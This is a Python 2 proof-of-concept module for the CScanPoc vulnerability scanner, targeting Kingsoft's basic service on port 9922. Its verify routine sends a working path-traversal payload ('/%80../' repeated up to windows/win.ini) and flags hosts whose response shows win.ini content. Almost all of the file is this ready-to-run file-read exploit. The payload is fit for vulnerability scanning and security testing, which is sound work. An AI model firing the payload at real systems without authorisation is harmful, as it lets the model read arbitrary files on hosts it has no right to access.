# coding: utf-8
import urlparse
import socket
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Kingsof_0101' # 平台漏洞编号
    name = '金山软件基础服务 默认监听端口远程查看、下载文件' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2012-04-21'  # 漏洞公布时间
    desc = '''模版漏洞描述
    通过“金山软件基础服务”监听的9922端口，攻击者可远程查看系统任意文本文件。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=5103
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Kingsof'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '80b07d9f-1ecd-455d-a67e-3bdd9af11bab' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/%80../%80../%80../%80../%80../%80../windows/win.ini"
            target_parse = urlparse.urlparse(self.target)
            ip = socket.gethostbyname(target_parse.hostname)
            port = target_parse.port if target_parse.port else 9922
            url = "http://"+ip+":"+str(port)+payload
            respone = requests.get(url)
            if "[fonts]" in respone.text or "[files]" in respone.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
